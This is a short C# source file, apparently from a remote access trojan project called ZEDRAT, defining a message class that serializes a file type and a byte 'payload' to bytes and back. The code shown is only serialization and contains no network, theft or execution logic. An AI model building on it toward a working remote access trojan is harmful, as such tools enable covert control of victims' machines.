using System.IO;

namespace ZEDRAT.Messages
{
	public class Remote_File_Messgaes
	{
		public string FileType;

		public byte[] payload;

		public Remote_File_Messgaes()
		{
		}

		public Remote_File_Messgaes(string type, byte[] bt)
		{
			this.FileType = type;
			this.payload = bt;
		}

		public static byte[] ClassToByte(object ob)
		{
			Remote_File_Messgaes remote_File_Messgaes = (Remote_File_Messgaes)ob;
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(remote_File_Messgaes.FileType);
			binaryWriter.Write((uint)remote_File_Messgaes.payload.Length);
			binaryWriter.Write(remote_File_Messgaes.payload);
			return memoryStream.ToArray();
		}

		public static Remote_File_Messgaes ByteToClass(byte[] b)
		{
			Remote_File_Messgaes remote_File_Messgaes = new Remote_File_Messgaes();
			using MemoryStream input = new MemoryStream(b);
			using BinaryReader binaryReader = new BinaryReader(input);
			remote_File_Messgaes.FileType = binaryReader.ReadString();
			remote_File_Messgaes.payload = binaryReader.ReadBytes((int)binaryReader.ReadUInt32());
			return remote_File_Messgaes;
		}
	}
}
